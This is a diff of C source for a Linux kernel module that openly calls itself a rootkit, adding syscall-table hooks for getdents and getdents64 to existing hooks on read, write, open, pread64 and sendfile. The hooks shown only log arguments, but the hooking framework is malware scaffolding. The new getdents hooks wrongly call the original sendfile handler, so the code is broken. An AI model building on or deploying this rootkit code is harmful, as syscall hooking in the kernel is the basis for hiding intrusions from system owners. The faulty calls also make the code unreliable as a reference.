@@ -1,6 +1,7 @@
 #include "rootkit-main.h"
 
 #include "hooking.h"
+#include <linux/dirent.h>
 #include <linux/ioctl.h>
 #include <linux/limits.h>
 #include <linux/linkage.h>
@@ -18,13 +19,18 @@ MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
 MODULE_DESCRIPTION("A Linux kernel rootkit");
 MODULE_VERSION("0.1");
 
-static sysfun_t orig_read;
-static sysfun_t orig_write;
-static sysfun_t orig_open;
-static sysfun_t orig_pread64;
-static sysfun_t orig_sendfile;
-// static sysfun_t orig_readv;
-// static sysfun_t orig_preadv;
+static sysfun_t orig_read;       // 0
+static sysfun_t orig_write;      // 1
+static sysfun_t orig_open;       // 2
+static sysfun_t orig_pread64;    // 17
+static sysfun_t orig_sendfile;   // 40
+static sysfun_t orig_getdents;   // 78
+static sysfun_t orig_getdents64; // 217
+// static sysfun_t orig_pwrite64; // 18
+// static sysfun_t orig_readv;    // 19
+// static sysfun_t orig_writev;   // 20
+// static sysfun_t orig_preadv;   // 295
+// static sysfun_t orig_pwritev;  // 296
 
 static hook_t p_syscall_hooks[] = {
     NEW_HOOK(__NR_read, new_read, orig_read),
@@ -32,8 +38,13 @@ static hook_t p_syscall_hooks[] = {
     NEW_HOOK(__NR_open, new_open, orig_open),
     NEW_HOOK(__NR_pread64, new_pread64, orig_pread64),
     NEW_HOOK(__NR_sendfile, new_sendfile, orig_sendfile),
+    NEW_HOOK(__NR_getdents, new_getdents, orig_getdents),
+    NEW_HOOK(__NR_getdents64, new_getdents64, orig_getdents64),
+    // NEW_HOOK(__NR_pwrite64, new_pwrite64, orig_pwrite64),
     // NEW_HOOK(__NR_readv, new_readv, orig_readv),
+    // NEW_HOOK(__NR_writev, new_writev, orig_writev),
     // NEW_HOOK(__NR_preadv, new_preadv, orig_preadv),
+    // NEW_HOOK(__NR_pwritev, new_pwritev, orig_pwritev),
 };
 
 static int __init rootkit_init(void)
@@ -197,6 +208,28 @@ asmlinkage long new_sendfile(struct pt_regs *p_regs)
     size_t sz_count         = (size_t)p_regs->r10;
 
     pr_info("[ROOTKIT] sendfile(%d, %d, %p, %zu)", i32_out_fd, i32_in_fd, p_offset, sz_count);
+
+    return orig_sendfile(p_regs);
+}
+
+asmlinkage long new_getdents(struct pt_regs *p_regs)
+{
+    unsigned int ui32_fd                 = (unsigned int)p_regs->di;
+    struct linux_dirent __user *p_dirent = (struct linux_dirent __user *)p_regs->si;
+    unsigned int ui32_count              = (unsigned int)p_regs->dx;
+
+    pr_info("[ROOTKIT] getdents(%u, %p, %u)", ui32_fd, p_dirent, ui32_count);
+
+    return orig_sendfile(p_regs);
+}
+
+asmlinkage long new_getdents64(struct pt_regs *p_regs)
+{
+    unsigned int ui32_fd                   = (unsigned int)p_regs->di;
+    struct linux_dirent64 __user *p_dirent = (struct linux_dirent64 __user *)p_regs->si;
+    unsigned int ui32_count                = (unsigned int)p_regs->dx;
+
+    pr_info("[ROOTKIT] getdents64(%u, %p, %u)", ui32_fd, p_dirent, ui32_count);
 
     return orig_sendfile(p_regs);
 }
